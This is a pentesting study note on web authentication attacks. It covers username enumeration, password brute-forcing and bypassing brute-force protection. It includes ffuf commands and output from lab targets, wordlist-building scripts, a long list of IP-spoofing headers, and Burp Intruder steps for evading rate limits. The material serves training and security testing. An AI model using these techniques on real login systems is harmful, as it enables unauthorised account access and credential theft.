---
created: 2026-04-30
---
## Username enumeration

>**Username enumeration vulnerabilities** occur when an application allows an attacker to determine whether a specific user exists in a system by analyzing differences in the application's responses to valid and invalid inputs. 

One of the most common ways to enumerate usernames is to analyse application responses to **login attempts**, looking for differences that reveal whether a given user exists.


**Username enumeration is primarily exploited through**:

- **Verbose error messages**
	- The application returns different error texts for invalid usernames (e.g., `User not found` or `Invalid username`) versus valid passwords (e.g., `Incorrect password`), explicitly confirming account existence. This is often reflected in response length.

- **Differences in application responses**
	- Other than explicit error messages, even slight variations in application responses can often be exploited. 
	- These can include typos, extra spaces, punctuation,  etc., and something more evident like HTTP status codes; this is often reflected in response length, too.

- **Timing attacks** (side-channel attacks)
	- Subtle differences in server response times occur because applications may skip database lookups for non-existent users or perform extra processing for valid ones. This can be used by automated tools, too.

- **Account lockout behavior**
	- Systems that lock accounts after a set number of failed attempts reveal valid usernames when the `Account locked` message appears, whereas invalid usernames do not trigger this state.

>[!example]+
>- Below is an example of username enumeration with `ffuf`, where a slight difference in response length points to a valid username:
> 
> ```bash
> ffuf -X POST -u https://example.com/login -d "username=FUZZ&password=invalid_password" -w usernames.txt
> ```
> 
> ![[username_enumeration_ffuf.png]]
> 
> Here is a similar example from Burp Intruder:
> 
> ![[incorrect_password_burp.png]]
> 

>[!bug]+ Labs
>- [[🛠️ Authentication labs#1. Username enumeration via different responses|1. Username enumeration via different responses]]
>- [[🛠️ Authentication labs#4. Username enumeration via subtly different responses|4. Username enumeration via subtly different responses]]
>- [[🛠️ Authentication labs#5. Username enumeration via response timing|5. Username enumeration via response timing]]
>- [[🛠️ Authentication labs#7. Username enumeration via account lock|7. Username enumeration via account lock]]

**Other functionality commonly vulnerable to username enumeration include**:

- **Registration page enumeration**
	- Attempting to register an account with an already-taken existing username often cause an error like "This username is already taken" or "The username is invalid".

- **Password reset functionality**
	- Password reset attempts will likely to fail for non-existing usernames, which can reveal which usernames exist and which aren't.

- **Account lockout on failed login attempts**
	- Lockouts might be triggered only on valid usernames. This can be exploited in username enumeration: if an account is locked after 3-5 (typical lockout threshold) failed login attempts with a given username, the account probably exists, and doesn't otherwise.	

**Other places to search for valid usernames**: 

- **OSINT (Open-Source Intelligence)**
	- Professional networks and social media, e.g., LinkedIn, Facebook, etc.
	- Public code repositories: commits, issues, profiles in GitHub, GitLab, and other platforms
	- Certificate transparency logs
	- Document metadata (e.g., PDFs, images, etc.)

- **Leaked credentials**
	- Data from previous breaches exposed to the public.

- **API endpoint scraping**
	- APIs, especially poorly designed ones, may expose usernames via inconsistent JSON responses, HTTP status codes, or error messages when queried with usernames or user IDs. That's why it's important to inspect not only visible HTML but also fetch all available API traffic.

- **Default usernames**
	- Many ready-to-use web frameworks and CMSs (Content Management Systems) create default usernames. If these users haven't been deleted in production, you may be able to find them with the help of documentation of the technologies in use.
	- Investigate the programming language, frameworks, and other technologies that were used in the development of the target web application. Search for documentation for default credentials for admin panels, databases, and so on. Try using these credentials against the target.

- **Source code comments**
	- Sometimes developers might note usernames and passwords in HTML or JavaScript comments and forget to clean the code. 

- **Hidden or forgotten sensitive files**
	- 
	
The application may also expose usernames by design. For example:

- **Social media and user profiles**
	- Social media platforms and forums often expose usernames publicly by design, as well as other valuable information.

- **Ranking systems**
	- Some applications implement ranking systems for users who solves quizzes, competitions, CTFs, scores certain number of internal points, etc. This functionality can expose usernames. 

- **Application content**
	- Names, emails, and usernames can sometimes be found in blog posts, documentation, terms of services, "About"/"Team"/"Contact" pages, and so on.

### Wordlists for username enumeration

- From [`SecLists/Usernames`](https://github.com/danielmiessler/SecLists/tree/master/Usernames):

| Wordlist                                                                                                                                                    | Default path                                                      | Description                                                                                                             | Entries |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------- |
| [`top-usernames-shortlist.txt`](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt "top-usernames-shortlist.txt") | `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`       | Short list of the most common/default accounts (e.g., `root`, `admin`, `test`, `user`, etc.). First try in enumeration. | `17`    |
| [`Names/names.txt`](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)                                                                 | `/usr/share/seclists/Usernames/Names/names.txt`                   | First names, last names, combinations; useful for AD and emails.                                                        | `10.7K` |
| [`CommonAdminBase64.txt`](https://github.com/danielmiessler/SecLists/blob/master/Usernames/CommonAdminBase64.txt)                                           | `/usr/share/seclists/Usernames/CommonAdminBase64.txt `            | Common usernames + their Base64-encoded variant.                                                                        | `113`   |
| [`xato-net-10-million-usernames.txt`](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)                   | `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | Real usernames collected from breaches (e.g., `HaveIBeenPwned`, etc.).                                                  | `~10M`  |
- Default paths:

```
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/CommonAdminBase64.txt 
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Creating custom wordlists

- The best approach is to generate custom wordlists for users you target based on information you already know about them. 

>[!info] Many organizations use predictable username and email address patterns based on employee's first and last name (e.g. `john.doe`, `jdoe`, etc.). This can be useful in enumeration.

- For example, you can use this Python script to generate a custom wordlist is you know first and last name of your target:

```Python
first = "John"
last = "Doe"
patterns = [
    f"{first}.{last}",
    f"{first}{last}",
    f"{first[0]}{last}",
    f"{first}_{last}",
    f"{last}{first[0]}",
    f"{first}",
    f"{last}",
    f"{first[0]}.{last}",
    f"{last}.{first[0]}",
    f"{first}{last[0]}",
    f"{first[0]}{last[0]}",
]
for username in patterns:
    print(username)
```

It generates a list of possible usernames for a person named Jane Doe. **But this barely scratches the surface.** There are thousands more variations: usernames can include middle name, birth year, cherished hobby, favorite movie, book, character, or whatever else the user decides to put there.


- You can also use the [`Username Anarchy`](https://github.com/urbanadventurer/username-anarchy) tool:

```bash
./username-anarchy Jane Doe > jane_doe_usernames.txt
```


>[!note] Installation
>```bash
>git clone https://github.com/urbanadventurer/username-anarchy.git && \
>cd username-anarchy
>```

| Option                         | Description                                                                                |
| ------------------------------ | ------------------------------------------------------------------------------------------ |
| `-i`, `--input-file <file>`    | Input list of names; can be space-, comma-, or tab-separated.                              |
| `-a`, `--auto`                 | Automatically generate names from a country dataset or predefined list.                    |
| `-c`, `--country <country>`    | Select dataset (e.g., `us`, `uk`, `france`, `germany`, etc., or Facebook top `10k` names). |
| `--given-names <file>`         | Custom dictionary file for given (first) names.                                            |
| `--family-names <file>`        | Custom dictionary file for family (last) names.                                            |
| `-s`, `--substitute <on/off>`  | Enable/disable substitutions (`on` or `off`). <br>Default: `off`.                          |
| `-m`, `--max-sub <number>`     | Limit number of substitutions per plugin. <br>Default: `unlimited` (`-1`).                 |
| `-l`, `--list-formats`         | List all available username format plugins.                                                |
| `-f`, `--select-format <list>` | Choose specific format plugins (comma-separated).                                          |
| `-r`, `--recognise <username>` | Detect which format a username uses (uses Facebook dataset).                               |
| `-F`, `--format <format>`      | Define a custom username format (string or ABK format).                                    |
| `-@`, `--suffix <suffix>`      | Add suffix (e.g., `@example.com`) to usernames.                                            |
| `-C`, `--case-insensitive`     | Generate case-insensitive usernames (default: lowercase).                                  |
| `-v`, `--verbose`              | Show detailed output, including plugin comments and recognition progress.                  |
| `-h`, `--help`                 | Display help menu.                                                                         |


>[!example]+ Example: List formats
> ```bash
> ./username-anarchy -l
> Plugin name         	Example
> --------------------------------------------------------------------------------
> first               	anna
> firstlast           	annakey
> first.last          	anna.key
> firstlast[8]        	annakey
> first[4]last[4]     	annakey
> firstl              	annak
> f.last              	a.key
> flast               	akey
> lfirst              	kanna
> l.first             	k.anna
> lastf               	keya
> last                	key
> last.f              	key.a
> last.first          	key.anna
> FLast               	AKey
> first1              	anna0,anna1,anna2
> fl                  	ak
> fmlast              	abkey
> firstmiddlelast     	annaboomkey
> fml                 	abk
> FL                  	AK
> FirstLast           	AnnaKey
> First.Last          	Anna.Key
> Last                	Key
> ```


- Burp Suite Professional includes a built-in username generator in Intruder. 
- Another useful Burp Suite-specific tool is the `Name Mangler` module from the [`CO2`](https://portswigger.net/bappstore/c5071c7a7e004f72ae485e8a72911afc) extension.
- See also [`soxoj/username-generation-guide`](https://github.com/soxoj/username-generation-guide).

### Automating username enumeration

- Enumerate valid users by filtering out responses with `Invalid username` messages:

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  \
	 -u https://<target>/login.php \
	 -H "Content-Type: application/x-www-form-urlencoded" \
	 -X POST -d "username=FUZZ&password=invalid" \
	 -fr "Invalid username"
```

>[!tip] You can match something like `Invalid password` instead, e.g., `-mr "Invalid password"`.

- Some useful `ffuf` matching/filtering options:

| Match | What                                                                                   | Filter |
| :---: | :------------------------------------------------------------------------------------- | :----: |
| `-mc` | HTTP status codes.                                                                     | `-fc`  |
| `-ms` | HTTP response size.                                                                    | `-fs`  |
| `-mw` | Words in responses.                                                                    | `-fw`  |
| `-ml` | Lines in HTTP response.                                                                | `-fl`  |
| `-mr` | Regular expression.                                                                    | `-fr`  |
| `-mt` | Timing (milliseconds to the first response byte), <br>e.g., `">1000"`, `"<1000"`, etc. | `-ft`  |

>[!example]+
> - For example, a web application responds with `Unknown user` if the username is invalid:
> 
> ![[username_enumeration_response_differences_1.png]]
> 
> - And `Invalid credentials` if just the password is wrong:
> 
> ![[username_enumeration_response_differences_2.png]]
> 
> - To enumerate users, you can construct the following command:
> 
> ```bash
> ffuf -u http://154.57.164.76:32564/index.php \
> 	 -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
> 	 -H "Content-Type: application/x-www-form-urlencoded" \
> 	 -X POST -d "username=FUZZ&password=invalid"  \
> 	 -fr "Unknown user" \
> 	 -c -ic 
> ```
> 
> ```bash
> 
>         /'___\  /'___\           /'___\       
>        /\ \__/ /\ \__/  __  __  /\ \__/       
>        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
>         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
>          \ \_\   \ \_\  \ \____/  \ \_\       
>           \/_/    \/_/   \/___/    \/_/       
> 
>        v2.1.0-dev
> ________________________________________________
> 
>  :: Method           : POST
>  :: URL              : http://154.57.164.76:32564/index.php
>  :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
>  :: Header           : Content-Type: application/x-www-form-urlencoded
>  :: Data             : username=FUZZ&password=invalid
>  :: Follow redirects : false
>  :: Calibration      : false
>  :: Timeout          : 10
>  :: Threads          : 40
>  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
>  :: Filter           : Regexp: Unknown user
> ________________________________________________
> 
> cookster                [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 4355ms]
> ```


## Password brute-force


Passwords remain one of the most common online authentication methods, yet they are plagued by many issues:
- **Password reuse** 
	- People often use the same password across multiple accounts for simplicity. If one account is compromised, attackers can potentially gain access to other accounts with the same credentials.
	- An attacker who obtained a list of passwords from a password leak can try the same passwords on other web applications. This is called **Password Spraying**.
- **Weak passwords**
	- The use of weak passwords based on typical phrases, dictionary words, or simple patterns.

>A **brute-force attack** is a systematic, automated trial-and-error attack used to crack login credentials or encryption keys.


>[!tip] 
>Always enumerate valid usernames/emails before password brute-forcing. This dramatically speeds up the process.

There are three main types of password brute-force attacks:

- **Simple (exhaustive, brute) brute force**
	- Trying all possible character combinations up to a certain length  (e.g., trying all alphanumeric + special characters up to length `N`). 
	- Highly resource- and time-consuming.
	- Effective only against very weak or short passwords. 

- **Dictionary attack**
	- Brute-forcing over a predefined wordlist (dictionary) of common or leaked passwords.
	- Faster and often more effective than simple brute-force.

- **Hybrid attack**
	- Blending dictionary words with character mutations like [`leetspeak`](https://en.wikipedia.org/wiki/Leet), suffixes, repetitions, or character substitutions (e.g., `password2025`, `password2026`, etc.)
	- Hybrid attacks start with dictionary words and add mutations such as character substitution (e.g., `a`->`@` or [`leet`](https://en.wikipedia.org/wiki/Leet)), repetitions, or number suffixes.

>[!important] 
>Before starting a brute-force attack, identify differences between failed attempts and successful login. 

### Attack types

- **Simple brute-force**
	- Probing multiple passwords for a single username.

- **Credential stuffing**
	- Using real username-password pairs leaked from breaches of other sites; this exploits the tendency of users to have the same username and password across many platforms.

- **Reverse brute-force**
	- One common password is tested across many usernames.

- **Password spraying**
	- Testing a small set of common passwords against a very large username list (e.g., trying passwords like `123123` or `qwerty` against all discovered usernames in an organization).
	- Designed to evade lockout or throttling mechanisms based on the username probed, as it minimizes the number of failed login per username within a defined period of time.
### Password wordlists

For instance, the popular password wordlist `rockyou.txt` contains more than 14 million passwords:

```bash
wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt
```

>[!note] See [[🛠️ Password wordlists and default credentials]].

### Password policy

>A **password policy** is a set of rules and controls that define how passwords are created, managed, stored, and protected.

- Applications often implement password policy to enforce minimum password length (often 8-15+ characters) and, in some traditional frameworks, a mix of character types, though modern guidance prioritizes length and uniqueness over arbitrary complexity rules.
- Other than that, password policy is used to mandate that passwords are **salted and hashes** using strong one-key derivation functions to resist offline attacks.

> [!interesting]+
> Here is some statistics. According to [Georgia Tech study](https://www.cc.gatech.edu/news/largest-study-its-kind-shows-outdated-password-practices-are-widespread):
> - 12% of websites completely lack password length requirements.
> - 75% of websites fail to require the recommended 8-character minimum.
> - 30% of website did not support spaces or special characters.
> 
> - Check publicly available documentation or password guidelines on registration pages.
> - Try registering several accounts with weak passwords, or change an existing password to a weak one.



However, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy. For example, if `mypassword` is not allowed, users may try something like `Mypassword1!` or `Myp4$$w0rd` instead.

In cases where the policy requires users to change their passwords on a regular basis, it is also common for users to just make minor, predictable changes to their preferred password. For example, `Mypassword1!` becomes `Mypassword1?` or `Mypassword2!.`

>[!note] If the application employs no or minimal controls over password quality, users **will eventually** create weak, easy-to-guess passwords.

>[!note] Even if the application forbids users from using weak passwords during registration, it may not enforce password quality rules during password changes.

>[!bug]+ DoS through password brute-forcing
>If the application doesn't enforce limits on *maximum* password length that can be submitted in the login form, and calculates hashes over the strings sent in the password field, it might be possible to **DoS** the application by submitting lots of login requests with very long strings in password parameters. The server will calculate hashes over and over until it can no longer.

You `grep` to match only those passwords that comply the password policy implemented by the target web application:

- March only those password that contain **uppercase** letters:

```bash
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt
```

- March only those password that contain **lowercase** letters:

```bash
grep '[[:lower:]]' /usr/share/wordlists/rockyou.txt
```

- March only those password that contain **digits**:

```bash
grep '[[:digit:]]' /usr/share/wordlists/rockyou.txt
```

- Match only passwords with minimum of `10` character in length:

```bash
grep -E '.{10}' /usr/share/wordlists/rockyou.txt
```

- Combined: 

```bash
cat /usr/share/wordlists/rockyou.txt | grep '[[:upper:]]' | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

### Automating password brute-force

```bash
ffuf -w ./custom_wordlist.txt -u http://154.57.164.71:30616/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://154.57.164.71:30616/index.php
 :: Wordlist         : FUZZ: /home/htb-ac-1908986/custom_wordlist.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid username
________________________________________________

Ramirez120992           [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
```


## Flawed brute-force protection

Brute-force protection mechanisms aim to **restrict automated, rapid, and repeated login attempts** to prevent attackers from guessing valid credentials. 

There are two most commonly used ways to enforce brute-force protection:

- **Account lockout**
	- Temporary or permanently locking the account the remote user is trying to access after a certain number of failed login attempts within a short time frame.

- **IP address blocking**
	- Blocking requests from a certain IP address from which a certain number of failed login attempts has originated within a specific time frame.
	- The address can then be unlocked either automatically after some time, manually by administrator, or manually by user after successfully completing CAPTCHA. 

>[!tip]
>Sometimes, brute-force protection is based on client identifiers such as the value of the `User-Agent` HTTP header. In this case, to detect this and bypass restrictions, you can spoof the value of this header. 
>See [`SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt).

Other than simply blocking, protection may be:

- **Rate-limiting**
	- Limiting the number of login attempts per a user account or IP address in a given time frame.

- **Progressive delays**
	- Increasing response delay after each failed login attempt for an account or IP address.

- **CAPTCHA challenges**
	- Enforcing [CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA) verification after a number of failed login attempts for a given user or IP address to make automated attacks challenging or impossible.

But such protection can be vulnerable to bypasses itself. Common flaws include:

- **Resetting counters on successful login**
	- Some systems reset the failed login counter for an IP address or account after one successful login for a different account. 
	- To exploit this, you can intersperse password guesses with one successful login to your controlled account to keep resetting the counter and evade limits.

- **Locking only per account but allowing unlimited tries per IP address/username combination**
	- Password spraying or reverse brute-forcing attacks can effectively evade this.

- **Rate liming or locking is enforced only on client-side**
	- Rate limiting enforced via front-end JavaScript can be easily bypassed any any other client-side protection, since the you, in fact, can control everything on the client-side.
	- For example, you can try clearing cookies, browser cache, etc. (or starting from a new private window, for example).

- **Weak CAPTCHA**
	- Poorly implemented CAPTCHAs can often be bypassed entirely, or be susceptible to automation.

- **No lockout on API or secondary authentication endpoints**
	- The application may expose alternative ways to log in which don't implement any brute-force protection.
	- Additionally, protection may be properly implemented for only certain clients, such as desktop users, but be flawed or even absent for, say, mobile users. To detect this, try fuzzing `User-Agent` header. Here is a good wordlist for this purpose: [`SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt).

- **IP address spoofing**
	- Some applications trust IP addresses specified in certain HTTP headers or parameters in the request, assuming they were set by a proxy. You can spoof your real IP address by simply changing the IP address in the request.

- **Not detecting proxy**
	- IP address-based brute-force protection can often be bypassed by changing a real IP address via proxy servers, VPNs, Tor, or even botnets. Request can be distributed across or cycled-through a pool of IP addresses and blocking one of them is ineffective.

- **HTTP verb tampering**
	- Rate-limiting or lockout may be implemented correctly only for certain HTTP methods, such as `POST`, but not for others. Try different HTTP methods, such as `PUT` or `PATCH`.

- **Predictable or long account lockout**
	- Lockouts lasting excessively long or indefinite can be exploited to **DOS (Denial-Of-Service)** against legitimate users (lockout abuse).

If it seems impossible to bypass account lockout or rate-limiting, and you have some time, you can use slow attacks, sending a few login attempts per hour. If the target password is weak enough, you will eventually guess it.

>[!tip] Implementations of HTTP Basic authentication often don't support any brute-force protection, and therefore are susceptible to enumeration. 

### IP address spoofing: manipulating HTTP headers

`X-Forwarded-For` is often used by intermediary servers to track the originating IP address of the client. However, if the proxy forwards this header to the back-end without validation, and the application uses it to determine the client IP address, it's possible to use this header to spoof the real IP address and bypass IP-based rate limits or blocking.

```HTTP
X-Forwarded-For: 1.1.1.1
```

`X-Forwarded-For` is not the only such header, though the most widely used. 

Other headers that can be used for IP address spoofing include:
```
X-Forwarded-For
X-Real-IP
X-Client-IP
X-Remote-IP
X-Remote-Addr
Forwarded: for=
X-Originating-IP
Client-IP
```

>[!tip] A list of IP address spoofing HTTP headers

Below is a more comprehensive list of such headers. 
Source: [`IP Spoofing via HTTP Headers — OWASP`](https://owasp.org/www-community/pages/attacks/ip_spoofing_via_http_headers)

```
CACHE_INFO: 127.0.0.1
CF_CONNECTING_IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
CLIENT_IP: 127.0.0.1
Client-IP: 127.0.0.1
COMING_FROM: 127.0.0.1
CONNECT_VIA_IP: 127.0.0.1
FORWARD_FOR: 127.0.0.1
FORWARD-FOR: 127.0.0.1
FORWARDED_FOR_IP: 127.0.0.1
FORWARDED_FOR: 127.0.0.1
FORWARDED-FOR-IP: 127.0.0.1
FORWARDED-FOR: 127.0.0.1
FORWARDED: 127.0.0.1
HTTP-CLIENT-IP: 127.0.0.1
HTTP-FORWARDED-FOR-IP: 127.0.0.1
HTTP-PC-REMOTE-ADDR: 127.0.0.1
HTTP-PROXY-CONNECTION: 127.0.0.1
HTTP-VIA: 127.0.0.1
HTTP-X-FORWARDED-FOR-IP: 127.0.0.1
HTTP-X-IMFORWARDS: 127.0.0.1
HTTP-XROXY-CONNECTION: 127.0.0.1
PC_REMOTE_ADDR: 127.0.0.1
PRAGMA: 127.0.0.1
PROXY_AUTHORIZATION: 127.0.0.1
PROXY_CONNECTION: 127.0.0.1
Proxy-Client-IP: 127.0.0.1
PROXY: 127.0.0.1
REMOTE_ADDR: 127.0.0.1
Source-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Via: 127.0.0.1
WL-Proxy-Client-IP: 127.0.0.1
X_CLUSTER_CLIENT_IP: 127.0.0.1
X_COMING_FROM: 127.0.0.1
X_DELEGATE_REMOTE_HOST: 127.0.0.1
X_FORWARDED_FOR_IP: 127.0.0.1
X_FORWARDED: 127.0.0.1
X_IMFORWARDS: 127.0.0.1
X_LOCKING: 127.0.0.1
X_LOOKING: 127.0.0.1
X_REAL_IP: 127.0.0.1
X-Backend-Host: 127.0.0.1
X-BlueCoat-Via: 127.0.0.1
X-Cache-Info: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1, 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-From-IP: 127.0.0.1
X-From: 127.0.0.1
X-Gateway-Host: 127.0.0.1
X-Host: 127.0.0.1
X-Ip: 127.0.0.1
X-Original-Host: 127.0.0.1
X-Original-IP: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Original-Url: 127.0.0.1
X-Originally-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyMesh-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-True-Client-IP: 127.0.0.1
XONNECTION: 127.0.0.1
XPROXY: 127.0.0.1
XROXY_CONNECTION: 127.0.0.1
Z-Forwarded-For: 127.0.0.1
ZCACHE_CONTROL: 127.0.0.1
```
#### Burp Intruder's Pitchfork

The Pitchfork attack mode is used to test multiple parameters in a request with **different, but related, payloads** simultaneously. 

Pitchfork assigns **one payload set to each defined position** (up to 20), and iterates through them in parallel: the first item from each list is sent together, then the second from each and so on.

- Pitchfork is exactly what you need if you want to change, say, `X-Forwarded-For` IP addresses together with the passwords you probe. 

1. **Intercept a request** in Burp Proxy (e.g., a login `POST` request).
2. **Send the request to Burp Intruder** (right-click → `Send to Intruder`).
3. **Clear all payload positions except one you want to brute-force** (e.g., password or username). 
4. **Add a custom HTTP header to the request and a new payload position** for the value of that header:

```
X-Forwarded-For: §1§
```
or
```
X-Real-IP: §1§
```

5. **Load a list of IP addresses** as payloads for this header; here you have two options:
	- Use a list of pre-generated list of addresses.
	- Enumerate the last (or any) digit of the IP address with a list of numbers, e.g., `1.1.1.§1§`; you would use the `Numbers` payload type with the `1-254` number range.

![[payload_1.png]]

5. **Configure the attack type** as `Pitchfork` if you want to combine IP spoofing with password/username payloads (one address per password/username you try), or `Cluster bomb` if you want to test all combinations (one IP address per all password/username you try, then another IP address, and so on).
6. **Start the Intruder attack**.
7. **Analyze the responses** for differences indicating successful bypass or valid credentials.
#### Burp Proxy's `Match and Replace` rules for persistent spoofing

1. Go to `Proxy` → `Options` → `Match and Replace`.
2. Click `Add` to create a new rule.
3. Set `Type` to `Request header`.
4. Leave `Match` empty (to add a new header).
5. Set `Replace` to, for example:

```HTTP
X-Forwarded-For: 127.0.0.1
```

6. Click `OK`.

Now every request passing through Burp Proxy will have this header added, spoofing your IP.
#### `ffuf`

`ffuf` can also be used for enumeration attacks with IP address spoofing. For example:

```bash
ffuf -u https://example.com/login -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IPADDR" \
  -d "username=admin&password=FUZZ" \
  -w ip_addresses.txt:FUZZ,passwords.txt:FUZZ \
  -p 0,1
```

- `-u`: Target URL.
- `-X POST`: Use POST method.
- `-H "X-Forwarded-For: FUZZ"`: The `FUZZ` keyword is replaced by payloads from the wordlists.
- `-d`: `POST` data with `username=admin` and `password=FUZZ` (password payload).
- `-w ip_addresses.txt:FUZZ,passwords.txt:FUZZ`: Two payload files — one for IP addresses, one for passwords.
- `-p 0,1`: Payload positions 0 and 1 correspond to the two `FUZZ` placeholders in order.

## References and further reading

- [`Comprehensive Guide on Cupp - A wordlist Generating Tool — Hacking Articles`](https://www.hackingarticles.in/comprehensive-guide-on-cupp-a-wordlist-generating-tool/).


>[!note]+ Tools
> - [`Hydra`](https://github.com/vanhauser-thc/thc-hydra)
> - [`John the Ripper`](https://www.openwall.com/john/)
> - [`Hashcat`](https://hashcat.net/hashcat/)
> - [`Burp Suite Intruder`](https://portswigger.net/burp/documentation/desktop/tools/intruder)
> - [`Ncrack`](https://nmap.org/ncrack/)
> - [`ffuf`](https://github.com/ffuf/ffuf)/[`wfuzz`](https://github.com/xmendez/wfuzz)
> - [`Hashcat`](https://github.com/hashcat/hashcat)
> - [`Metasploit modules`](https://docs.metasploit.com/docs/modules.html)
